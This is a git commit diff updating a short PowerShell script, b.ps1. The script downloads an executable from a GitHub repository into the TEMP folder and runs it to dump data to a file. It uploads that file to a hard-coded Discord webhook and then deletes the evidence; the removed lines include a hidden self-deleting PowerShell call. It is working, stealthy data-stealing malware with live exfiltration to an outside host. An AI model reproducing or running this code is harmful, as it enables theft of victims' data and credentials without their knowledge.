d43be7b43e98f3abe04ab2eb915e15aef67c7907
nonamezxcvbnm <122991811+nonamezxcvbnm@users.noreply.github.com>
2023-01-18 22:14:34 +0100

    Update b.ps1

--- b.ps1
+++ b.ps1
@@ -1,11 +1,10 @@
-Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$HOME\Desktop\p.exe";
+Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$env:TEMP\p.exe";
 Start-Sleep -Seconds 2;
-& $HOME\Desktop\p.exe /stab "$HOME\Desktop\_";
+& $env:TEMP\p.exe /stext "$env:TEMP\_";
 Start-Sleep -Seconds 1;
 $webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
-
-$payload = @{ content = [IO.File]::ReadAllText("$HOME\Desktop\_") };
-Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
-Remove-Item -Path "$HOME\Desktop\p.exe";
-Remove-Item -Path "$HOME\Desktop\_";
-Start PowerShell -windowStyle hidden {"Remove-Item -Path $HOME\Desktop\b.ps1"};
+$content = Get-Content -Path "$env:TEMP\_" -Encoding Byte;
+$payload = @{ file = @{ name = "file.txt"; file = $content } };
+Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload -ContentType "multipart/form-data";
+Remove-Item -Path "$env:TEMP\p.exe";
+Remove-Item -Path "$env:TEMP\_";
